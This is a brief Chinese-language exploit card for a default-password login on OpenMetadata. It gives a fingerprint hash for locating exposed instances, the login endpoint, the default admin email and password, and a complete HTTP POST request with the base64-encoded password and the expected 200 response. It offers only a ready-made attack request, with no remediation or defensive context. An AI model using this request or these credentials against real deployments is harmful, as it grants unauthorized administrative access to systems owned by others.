# OpenMetadata-默认口令登录漏洞

- **系统**：OpenMetadata　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`icon_hash="733091897"`
- **请求**：`POST /api/v1/users/login HTTP/1.1`

**请求体 / payload**
```
默认账号：[admin@open-metadata.org](mailto:admin@open-metadata.org)
默认密码：admin
Host:
Content-Type: application/json
Cookie: i18next=zh-CN; redirectUrlPath=%2Fexplore; __session=%7B%22id%22%3A%2200611e0a-b368-4e82-a04d-15221dc1084a%22%2C%22created%22%3A1756178869912%2C%22createdAt%22%3A%222025-08-26T03%3A27%3A49.912Z%22%2C%22expires%22%3A1756180669912%2C%22expiresAt%22%3A%222025-08-26T03%3A57%3A49.912Z%22%7D
Content-Length: 57
{"email":"admin@open-metadata.org","password":"YWRtaW4="}
```
- **预期**：200　|　—